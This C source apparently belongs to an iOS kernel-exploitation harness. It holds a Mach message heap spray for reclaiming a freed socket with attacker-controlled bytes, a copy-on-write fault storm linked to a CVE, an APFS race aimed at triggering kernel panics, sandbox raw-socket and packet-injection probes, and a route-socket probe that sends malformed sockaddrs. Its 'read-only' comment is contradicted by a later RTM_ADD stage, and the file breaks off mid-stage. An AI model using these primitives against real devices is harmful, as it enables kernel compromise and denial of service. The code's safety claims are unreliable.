// Cross-zone reclaim spray for the socket-UAF harness.
// Sends MACH_MSG_OOL_DESCRIPTOR messages with MACH_MSG_VIRTUAL_COPY so the
// kernel copies the payload into fresh kernel memory. Deliberately *not*
// sockets, so a freed socket slot reclaimed this way holds attacker bytes.

#include <mach/mach.h>
#include <mach/message.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define SOCKUAF_MAX_PORTS 1024

static mach_port_t sockuaf_ports[SOCKUAF_MAX_PORTS];
static int sockuaf_port_count;

void sockuaf_ool_reset(void) { sockuaf_port_count = 0; }

int sockuaf_ool_count(void) { return sockuaf_port_count; }

int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
{
    if (count > SOCKUAF_MAX_PORTS - sockuaf_port_count)
        count = SOCKUAF_MAX_PORTS - sockuaf_port_count;
    if (count <= 0 || size == 0)
        return 0;

    uint8_t *buf = malloc(size);
    if (!buf)
        return 0;
    for (size_t i = 0; i < size; i += 8) {
        uint64_t v = fill;
        size_t n = size - i < 8 ? size - i : 8;
        memcpy(buf + i, &v, n);
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
            break;
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x4f4f5343;
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = buf;
        msg.desc.size = (mach_msg_size_t)size;
        msg.desc.deallocate = 0;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;

        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        sockuaf_ports[sockuaf_port_count++] = port;
        made++;
    }
    free(buf);
    return made;
}

/* ---- CoW / external-object fault storm (see analysis/krw-leads/CVE-2026-112576-cow.md) ---- */
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

typedef struct {
    uint8_t *base;
    uint64_t size;
    volatile int go;
} cow_thread_arg_t;

static void *cow_writer(void *p)
{
    cow_thread_arg_t *a = (cow_thread_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->base[i * 4096] ^= (uint8_t)(i & 0xff);
    }
    return NULL;
}


/* File-backed MAP_PRIVATE CoW storm: exercises the same vm_fault_page() CoW branch
   but through an interface the iOS sandbox permits. */
typedef struct {
    uint8_t *priv;
    uint8_t *shr;
    uint64_t size;
    volatile int go;
} cowf_arg_t;

static void *cowf_writer(void *p)
{
    cowf_arg_t *a = (cowf_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->priv[i * 4096] ^= (uint8_t)(i & 0xff);
        if (a->shr) {
            a->shr[i * 4096] += 1;
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap_private [2]=mmap_shared [3]=threads */
int cow_file_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    int first_err = 0;
    char path[512];

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        snprintf(path, sizeof(path), "%s/cowprobe_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }

        uint8_t *priv = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (priv == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }

        uint8_t *shr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

        cowf_arg_t t1 = { priv, shr, size, 0 };
        cowf_arg_t t2 = { priv, NULL, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cowf_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cowf_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[3]++;
        }

        if (shr && shr != MAP_FAILED) munmap(shr, size);
        munmap(priv, size);
        close(fd);
        unlink(path);
    }
    return first_err;
}


/* ---- APFS msync / invalidate racer ------------------------------------------
   Targets the error-path panics in apfs_vnops.c that 27.2 removed:
     "%s:%d: %s Failed to msync for ino %llu"          (site 0xfffffe000a9ac0f0)
     "%s:%d: %s Failed to invalidate %llu:%llu for ino" (site 0xfffffe000a9ac62c)
   Strategy: dirty a large shared mapping, then concurrently msync, madvise,
   ftruncate and remap it so the APFS invalidation paths race hard. */
typedef struct {
    uint8_t *base;
    int fd;
    uint64_t size;
    volatile int go;
} apfs_arg_t;

static void *apfs_writer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    /* bounded: pthread_cancel has no cancellation point in a pure memory loop */
    for (int i = 0; i < 200000; i++) {
        uint64_t off = (uint64_t)(rand() % 64) * 4096;
        if (off < a->size) {
            a->base[off] ^= (uint8_t)off;
        }
    }
    return NULL;
}

static void *apfs_syncer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    for (int i = 0; i < 4000; i++) {
        if (a->size < 8192) break;
        uint64_t chunk = 4096u * (uint64_t)(1 + (rand() % 32));
        uint64_t start = (uint64_t)(rand() % 64) * 4096;
        if (start >= a->size) start = 0;
        msync(a->base + start, chunk, (i & 1) ? MS_SYNC : MS_ASYNC);
        if (i % 8 == 0) {
            madvise(a->base + start, chunk, MADV_DONTNEED);
        }
        if (i % 64 == 0) {
            fsync(a->fd);
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap [2]=thread create */
int apfs_race_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    char path[512];
    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * 1024u;
        snprintf(path, sizeof(path), "%s/apfsrace_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }
        uint8_t *base = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (base == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }
        /* dirty every page so there is real state to invalidate */
        memset(base, 0x5a, size);

        apfs_arg_t w = { base, fd, size, 0 };
        apfs_arg_t sy = { base, fd, size, 0 };
        pthread_t tw, tsy;
        int ok = 1;
        if (pthread_create(&tw, NULL, apfs_writer, &w) != 0) ok = 0;
        if (pthread_create(&tsy, NULL, apfs_syncer, &sy) != 0) ok = 0;
        if (ok) {
            w.go = 1; sy.go = 1;
            pthread_join(tsy, NULL);
            pthread_join(tw, NULL);
        } else {
            stages[2]++;
        }

        munmap(base, size);
        /* invalidation cycle after unmapping: ftruncate cannot SIGBUS here */
        for (int k = 0; k < 8; k++) {
            if (ftruncate(fd, 0) == 0) {
                fsync(fd);
                ftruncate(fd, (off_t)size);
                fsync(fd);
            }
        }
        close(fd);
        unlink(path);
    }
    return 0;
}

/* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
int cow_probe_run(int rounds, int size_kb, int *stages)
{
    int first_kr = 0;
    vm_map_t self = mach_task_self();

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        mach_port_t entry = MACH_PORT_NULL;

        kern_return_t kr = mach_make_memory_entry_64(
            self, &size, 0,
            VM_PROT_READ | VM_PROT_WRITE,
            &entry, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            stages[0]++;
            if (!first_kr) first_kr = (int)kr;
            continue;
        }

        vm_address_t a1 = 0;
        kr = vm_map(self, &a1, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[1]++;
            if (!first_kr) first_kr = (int)kr;
            mach_port_deallocate(self, entry);
            continue;
        }
        memset((void *)a1, 0x5a, size);

        vm_address_t a2 = 0;
        kr = vm_map(self, &a2, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[2]++;
            if (!first_kr) first_kr = (int)kr;
            vm_deallocate(self, a1, (vm_size_t)size);
            mach_port_deallocate(self, entry);
            continue;
        }

        vm_address_t a3 = 0;
        if (vm_allocate(self, &a3, (vm_size_t)size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            kr = vm_copy(self, a1, (vm_size_t)size, a3);
            if (kr != KERN_SUCCESS) {
                stages[4]++;
                if (!first_kr) first_kr = (int)kr;
            }
        } else {
            stages[3]++;
            if (!first_kr) first_kr = (int)kr;
        }

        cow_thread_arg_t t1 = { (uint8_t *)a1, size, 0 };
        cow_thread_arg_t t2 = { (uint8_t *)a2, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cow_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cow_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[5]++;
        }

        vm_deallocate(self, a1, (vm_size_t)size);
        vm_deallocate(self, a2, (vm_size_t)size);
        if (a3) vm_deallocate(self, a3, (vm_size_t)size);
        mach_port_deallocate(self, entry);
    }
    return first_kr;
}

    // ---- Network-surface reachability probe (2026-11-14) -----------------------
    // Reports, from inside the app sandbox, which kernel-facing socket families an
    // unsigned app may actually create. This bounds every network-path lead
    // (raw-packet injection, the m_sum16/m_adj_sum16 checksum callers, PF_ROUTE /
    // PF_NDRV surfaces): if raw sockets are denied here, none of those paths is
    // reachable from an app-carried exploit on this build.
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <errno.h>
    #include <stdarg.h>
    #include <stdio.h>

    extern void log_from_c(const char *msg);

    #ifndef PF_NDRV
    #define PF_NDRV 27
    #endif
    #ifndef PF_ROUTE
    #define PF_ROUTE 17
    #endif
    #ifndef AF_SYSTEM
    #define AF_SYSTEM 32
    #endif
    #ifndef SYSPROTO_CONTROL
    #define SYSPROTO_CONTROL 2
    #endif

    static void nsp_log(const char *fmt, ...)
    {
        char buf[320];
        va_list ap;
        va_start(ap, fmt);
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);
        log_from_c(buf);
        /* Also mirror to stdout: devicectl --console captures stdout, whereas
           log_from_c only reaches the app's own session file. */
        fputs(buf, stdout);
        fputc('\n', stdout);
        fflush(stdout);
    }

    int network_surface_probe(void)
    {
        struct { const char *name; int dom; int type; int proto; } tab[] = {
            { "AF_INET/SOCK_RAW/ICMP",     AF_INET,   SOCK_RAW,  IPPROTO_ICMP },
            { "AF_INET/SOCK_RAW/UDP",      AF_INET,   SOCK_RAW,  IPPROTO_UDP },
            { "AF_INET/SOCK_RAW/TCP",      AF_INET,   SOCK_RAW,  IPPROTO_TCP },
            { "AF_INET/SOCK_RAW/RAW",      AF_INET,   SOCK_RAW,  IPPROTO_RAW },
            { "AF_INET/SOCK_DGRAM/IGMP",   AF_INET,   SOCK_DGRAM, IPPROTO_IGMP },
            { "AF_INET6/SOCK_RAW/ICMPV6",  AF_INET6,  SOCK_RAW,  IPPROTO_ICMPV6 },
            { "AF_INET6/SOCK_RAW/RAW",     AF_INET6,  SOCK_RAW,  IPPROTO_RAW },
            { "PF_NDRV/SOCK_RAW/0",        PF_NDRV,   SOCK_RAW,  0 },
            { "PF_ROUTE/SOCK_RAW/INET",    PF_ROUTE,  SOCK_RAW,  AF_INET },
            { "AF_SYSTEM/SOCK_DGRAM/CTRL", AF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL },
            { "AF_INET/SOCK_STREAM/TCP",   AF_INET,   SOCK_STREAM, IPPROTO_TCP },
            { "AF_UNIX/SOCK_DGRAM/0",      AF_UNIX,   SOCK_DGRAM, 0 },
        };
        int n = (int)(sizeof(tab) / sizeof(tab[0]));
        int ok = 0;
        nsp_log("[*] rawsock: probing %d socket families (network-surface reachability)", n);
        for (int i = 0; i < n; i++) {
            errno = 0;
            int fd = socket(tab[i].dom, tab[i].type, tab[i].proto);
            int e = errno;
            if (fd >= 0) {
                ok++;
                nsp_log("[+] %-28s OK fd=%d", tab[i].name, fd);
                close(fd);
            } else {
                nsp_log("[-] %-28s ERR errno=%d (%s)", tab[i].name, e, strerror(e));
            }
        }
        int bpf = open("/dev/bpf0", O_RDWR | O_NONBLOCK);
        nsp_log("%s /dev/bpf0 open errno=%d (%s)", bpf >= 0 ? "[+]" : "[-]",
                errno, strerror(errno));
        if (bpf >= 0) close(bpf);

        // Only meaningful when a raw IPv4 socket exists: can we craft and inject a
        // packet to our own loopback, and does it come back out of the input path?
        int raw = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (raw >= 0) {
            int one = 1;
            int r = setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
            nsp_log("[*] rawsock: IP_HDRINCL on ICMP raw -> %d errno=%d", r, errno);

            struct sockaddr_in dst;
            memset(&dst, 0, sizeof(dst));
            dst.sin_family = AF_INET;
            dst.sin_len = sizeof(dst);
            dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            unsigned char pkt[40];
            memset(pkt, 0, sizeof(pkt));
            pkt[0] = 0x45;
            pkt[2] = 0; pkt[3] = sizeof(pkt);       /* total length */
            pkt[8] = 64;                             /* ttl */
            pkt[9] = IPPROTO_ICMP;
            pkt[12] = 127; pkt[13] = 0; pkt[14] = 0; pkt[15] = 1;
            pkt[16] = 127; pkt[17] = 0; pkt[18] = 0; pkt[19] = 1;
            pkt[20] = 8; pkt[21] = 0;                /* echo request */
            errno = 0;
            ssize_t s = sendto(raw, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
            nsp_log("[*] rawsock: raw ICMP sendto(127.0.0.1) -> %zd errno=%d", s, errno);

            for (int k = 0; k < 8; k++) {
                unsigned char rb[512];
                ssize_t g = recvfrom(raw, rb, sizeof(rb), MSG_DONTWAIT, NULL, NULL);
                if (g > 0) {
                    nsp_log("[+] rawsock: self-injected loopback packet received, %zd bytes", g);
                    break;
                }
            }
            close(raw);
        } else {
            nsp_log("[-] rawsock: no raw IPv4 socket available for injection test");
        }

        nsp_log("[*] rawsock: %d/%d socket families opened", ok, n);
        return ok;
    }

            // ---- Route-socket (PF_ROUTE) characterisation probe (2026-11-14) --------
            // PF_ROUTE/SOCK_RAW was measured reachable from the app sandbox on both
            // devices (`--rawsock`). Static work on the one changed `bsd/net/route.c`
            // helper localised it to the ENCODE side: its only two callers build
            // RTM_IFINFO / RTM_NEWADDR notification records from kernel-owned interface
            // sockaddrs, so that 27.0.1 VERIFY cannot be driven by message contents.
            // This probe therefore measures something else, on device: whether the
            // route socket is bidirectional for an unsigned app, and how the input
            // parser reacts to deliberately malformed sockaddr declarations.
            //
            // READ-ONLY BY CONSTRUCTION: every request is RTM_GET / RTM_IFINFO, or an
            // invalid request that must fail inside the parser before any state change.
            // No RTM_ADD / RTM_DELETE / RTM_CHANGE is ever sent, so no route can be
            // installed on either device.
            //
            // The iOS SDK ships no <net/route.h>, so the message layout is declared
            // here and its sizeof is printed in the banner so a wrong guess is visible
            // rather than silent.

            #include <stddef.h>
            #include <net/if.h>
            #include <ifaddrs.h>
            #include <arpa/inet.h>

            #define AGX_RTM_VERSION 5
            #define AGX_RTM_GET     4
            #define AGX_RTM_IFINFO  14

            #define AGX_RTA_DST     0x0001
            #define AGX_RTA_GATEWAY 0x0002
            #define AGX_RTA_NETMASK 0x0004
            #define AGX_RTA_IFP     0x0010
            #define AGX_RTA_IFA     0x0020

            #define AGX_RTM_ADD     1
            #define AGX_RTM_DELETE  2

            #define AGX_RTF_UP       0x0001
            #define AGX_RTF_GATEWAY  0x0002

            struct agx_rt_metrics { uint32_t m[14]; };
            struct agx_rt_msghdr {
                uint16_t rtm_msglen;
                uint8_t  rtm_version;
                uint8_t  rtm_type;
                uint16_t rtm_index;
                int32_t  rtm_flags;
                int32_t  rtm_addrs;
                int32_t  rtm_pid;
                int32_t  rtm_seq;
                int32_t  rtm_errno;
                uint32_t rtm_use;
                uint32_t rtm_inits;
                struct agx_rt_metrics rtm_rmx;
            };

            static void rtp_log(const char *fmt, ...)
            {
                char buf[384];
                va_list ap;
                va_start(ap, fmt);
                vsnprintf(buf, sizeof(buf), fmt, ap);
                va_end(ap);
                log_from_c(buf);
                fputs(buf, stdout);
                fputc('\n', stdout);
                fflush(stdout);
            }

            static void rtp_dump(const char *tag, const uint8_t *b, int n)
            {
                int lim = n > 288 ? 288 : n;
                for (int off = 0; off < lim; off += 16) {
                    char hex[64];
                    int hp = 0;
                    for (int i = 0; i < 16; i++) {
                        if (off + i < n) hp += sprintf(hex + hp, " %02x", b[off + i]);
                        else             hp += sprintf(hex + hp, "   ");
                    }
                    hex[hp] = 0;
                    rtp_log("%s %04x:%s", tag, off, hex);
                }
            }

            static uint32_t rtp_rd32(const uint8_t *p)
            {
                return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
                       ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
            }

            static void rtp_hdr(const char *tag, const uint8_t *b, int n)
            {
                if (n < 8) { rtp_log("%s hdr: short (%d)", tag, n); return; }
                unsigned msglen = (unsigned)b[0] | ((unsigned)b[1] << 8);
                unsigned index  = (unsigned)b[4] | ((unsigned)b[5] << 8);
                uint32_t flags = n >= 16 ? rtp_rd32(b + 8) : 0;
                uint32_t addrs = n >= 20 ? rtp_rd32(b + 12) : 0;
                uint32_t pid   = n >= 24 ? rtp_rd32(b + 16) : 0;
                uint32_t seq   = n >= 28 ? rtp_rd32(b + 20) : 0;
                uint32_t err   = n >= 32 ? rtp_rd32(b + 24) : 0;
                rtp_log("%s hdr: msglen=%u version=%u type=%u index=%u "
                        "flags=0x%x addrs=0x%x pid=%u seq=%u errno=%u",
                        tag, msglen, (unsigned)b[2], (unsigned)b[3], index,
                        flags, addrs, pid, seq, err);
            }

            static void rtp_sas(const char *tag, const uint8_t *b, int n)
            {
                size_t off = sizeof(struct agx_rt_msghdr);
                if ((int)off >= n || off + 2 > (size_t)n) return;
                int idx = 0;
                while (off + 2 <= (size_t)n && idx < 8) {
                    unsigned sl = b[off];
                    unsigned fam = b[off + 1];
                    rtp_log("%s sa%d @0x%zx len=%u family=%u", tag, idx, off, sl, fam);
                    if (sl == 0) break;
                    size_t step = ((size_t)sl + 3) & ~(size_t)3;
                    if (step == 0) break;
                    off += step;
                    idx++;
                }
            }

            /* Returns bytes received, or -errno if the recv itself failed. */
            static int rtp_read(int fd, uint8_t *buf, int cap, int budget_ms)
            {
                int got = 0;
                for (int waited = 0; waited < budget_ms; waited += 40) {
                    ssize_t n = recv(fd, buf + got, (size_t)(cap - got), MSG_DONTWAIT);
                    if (n > 0) {
                        got += (int)n;
                        if (got >= cap) break;
                    } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        return -(int)errno;
                    }
                    usleep(40 * 1000);
                }
                return got;
            }

            int route_socket_probe(int *stages)
            {
                for (int i = 0; i < 9; i++) stages[i] = 0;
                int first_err = 0;

                rtp_log("[*] routesock start (PF_ROUTE bidirectionality + malformed-sockaddr probe)");
                rtp_log("[*] routesock layout: sizeof(hdr)=%zu version_off=%zu addrs_off=%zu",
                        sizeof(struct agx_rt_msghdr),
                        offsetof(struct agx_rt_msghdr, rtm_version),
                        offsetof(struct agx_rt_msghdr, rtm_addrs));

                errno = 0;
                int fd = socket(PF_ROUTE, SOCK_RAW, AF_INET);
                rtp_log("%s PF_ROUTE/SOCK_RAW/AF_INET -> fd=%d errno=%d (%s)",
                        fd >= 0 ? "[+]" : "[-]", fd, errno, strerror(errno));
                if (fd < 0) {
                    stages[0]++;
                    return errno ? errno : EPROTO;
                }

                /* Does the kernel push any state on attach, unprompted? */
                uint8_t rb[1024];
                int pre = rtp_read(fd, rb, sizeof(rb), 300);
                rtp_log("[*] routesock S0 unsolicited read -> %d bytes", pre);
                if (pre > 0) rtp_dump("S0", rb, pre);

                /* ---- S1: RTM_GET, sockaddr placed at the OLD (0x54) offset ----
                   The first run used this layout and still got a reply; this
                   stage keeps it so the two layouts can be compared directly. */
                {
                    uint8_t msg[0x200];
                    memset(msg, 0, sizeof(msg));
                    struct agx_rt_msghdr *rtm = (struct agx_rt_msghdr *)msg;
                    size_t off = 0x54;                       /* legacy guess */
                    struct sockaddr_in *sin = (struct sockaddr_in *)(msg + off);
                    sin->sin_len = sizeof(*sin);
                    sin->sin_family = AF_INET;
                    sin->sin_addr.s_addr = htonl(0xc0000201u);   /* 192.0.2.1 */
                    rtm->rtm_msglen = (uint16_t)(off + sin->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 1;

                    errno = 0;
                    ssize_t s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S1 GET @0x54 dst=192.0.2.1 msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    int got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S1 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S1", rb, got); rtp_hdr("S1", rb, got); rtp_sas("S1", rb, got); }
                    else stages[1]++;
                }

                /* ---- S2: RTM_GET, sockaddr at the MEASURED header size ----
                   The first reply put the first sockaddr at 0x5c, not 0x54, so
                   the real struct rt_metrics must be two words larger than the
                   published XNU one. This stage uses sizeof(agx_rt_msghdr). */
                {
                    uint8_t msg[0x200];
                    memset(msg, 0, sizeof(msg));
                    struct agx_rt_msghdr *rtm = (struct agx_rt_msghdr *)msg;
                    size_t off = sizeof(*rtm);
                    struct sockaddr_in *sin = (struct sockaddr_in *)(msg + off);
                    sin->sin_len = sizeof(*sin);
                    sin->sin_family = AF_INET;
                    sin->sin_addr.s_addr = htonl(0xc0000201u);   /* 192.0.2.1 */
                    rtm->rtm_msglen = (uint16_t)(off + sin->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 2;

                    errno = 0;
                    ssize_t s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S2 GET @0x%zx dst=192.0.2.1 msglen=%u -> %zd errno=%d",
                            off, (unsigned)rtm->rtm_msglen, s, errno);
                    int got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S2 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S2", rb, got); rtp_hdr("S2", rb, got); rtp_sas("S2", rb, got); }
                    else stages[2]++;
                }

                /* ---- S3: RTM_GET for loopback, same (corrected) layout ---- */
                {
                    uint8_t msg[0x200];
                    memset(msg, 0, sizeof(msg));
                    struct agx_rt_msghdr *rtm = (struct agx_rt_msghdr *)msg;
                    size_t off = sizeof(*rtm);
                    struct sockaddr_in *sin = (struct sockaddr_in *)(msg + off);
                    sin->sin_len = sizeof(*sin);
                    sin->sin_family = AF_INET;
                    sin->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
                    rtm->rtm_msglen = (uint16_t)(off + sin->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 3;

                    errno = 0;
                    ssize_t s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S3 GET dst=127.0.0.1 msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    int got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S3 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S3", rb, got); rtp_hdr("S3", rb, got); rtp_sas("S3", rb, got); }
                    else stages[3]++;
                }

                /* ---- S4: RTA_DST whose declared sa_len overruns the message ---- */
                {
                    uint8_t msg[0x200];
                    memset(msg, 0, sizeof(msg));
                    struct agx_rt_msghdr *rtm = (struct agx_rt_msghdr *)msg;
                    size_t off = sizeof(*rtm);
                    struct sockaddr_in *sin = (struct sockaddr_in *)(msg + off);
                    sin->sin_len = 0xff;                     /* declared 255, only 16 present */
                    sin->sin_family = AF_INET;
                    sin->sin_addr.s_addr = htonl(0xc0000201u);
                    rtm->rtm_msglen = (uint16_t)(off + 16);  /* truthful length */
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 4;

                    errno = 0;
                    ssize_t s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S4 GET sa_len=0xff msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    int got = rtp_read(fd, rb, sizeof(rb), 800);
                    rtp_log("[*] routesock S4 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S4", rb, got); rtp_hdr("S4", rb, got); }
                    else stages[4]++;
                }

                /* ---- S5/S6/S7/S8: can an unsigned app modify routing state? ----
                   Adds a route to TEST-NET-3 (198.51.100.0/24) via en0's own
                   address, confirms it with RTM_GET, deletes it, confirms again.
                   Nothing on either device talks to TEST-NET-3, so even a failed
                   delete leaves an inert route; no live route is ever installed. */
                {
                    uint32_t ifip = 0;
                    struct ifaddrs *ifa_head = NULL;
                    if (getifaddrs(&ifa_head) == 0) {
                        for (struct ifaddrs *p = ifa_head; p != NULL; p = p->ifa_next) {
                            if (p->ifa_addr != NULL && p->ifa_addr->sa_family == AF_INET &&
                                strcmp(p->ifa_name, "en0") == 0) {
                                struct sockaddr_in *s4 = (struct sockaddr_in *)p->ifa_addr;
                                ifip = ntohl(s4->sin_addr.s_addr);
                                break;
                            }
                        }
                        freeifaddrs(ifa_head);
                    }
                    rtp_log("[*] routesock S5 en0 IPv4 = %u.%u.%u.%u",
                            (ifip >> 24) & 0xff, (ifip >> 16) & 0xff,
                            (ifip >> 8) & 0xff, ifip & 0xff);

                    /* --- S5: RTM_ADD --- */
                    uint8_t msg[0x200];
                    struct agx_rt_msghdr *rtm;
                    size_t off = sizeof(*rtm);
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    struct sockaddr_in *dst = (struct sockaddr_in *)(msg + off);
                    dst->sin_len = sizeof(*dst); dst->sin_family = AF_INET;
                    dst->sin_addr.s_addr = htonl(0xc6336400u);  /* 198.51.100.0 */
                    off += (dst->sin_len + 3) & ~(size_t)3;
                    struct sockaddr_in *gwa = (struct sockaddr_in *)(msg + off);
                    gwa->sin_len = sizeof(*gwa); gwa->sin_family = AF_INET;
                    gwa->sin_addr.s_addr = htonl(ifip);
                    off += (gwa->sin_len + 3) & ~(size_t)3;
                    struct sockaddr_in *msk = (struct sockaddr_in *)(msg + off);
                    msk->sin_len = sizeof(*msk); msk->sin_family = AF_INET;
                    msk->sin_addr.s_addr = htonl(0xffffff00u);  /* /24 */
                    off += (msk->sin_len + 3) & ~(size_t)3;
                    rtm->rtm_msglen = (uint16_t)off;
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_ADD;
                    rtm->rtm_flags = AGX_RTF_UP | AGX_RTF_GATEWAY;
                    rtm->rtm_addrs = AGX_RTA_DST | AGX_RTA_GATEWAY | AGX_RTA_NETMASK;
                    rtm->rtm_seq = 5;

                    errno = 0;
                    ssize_t s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S5 RTM_ADD 198.51.100.0/24 msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    int got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S5 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S5", rb, got); rtp_hdr("S5", rb, got); }
                    else stages[5]++;

                    /* --- S6: RTM_GET the same prefix: did it take? --- */
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    off = sizeof(*rtm);
                    struct sockaddr_in *q = (struct sockaddr_in *)(msg + off);
                    q->sin_len = sizeof(*q); q->sin_family = AF_INET;
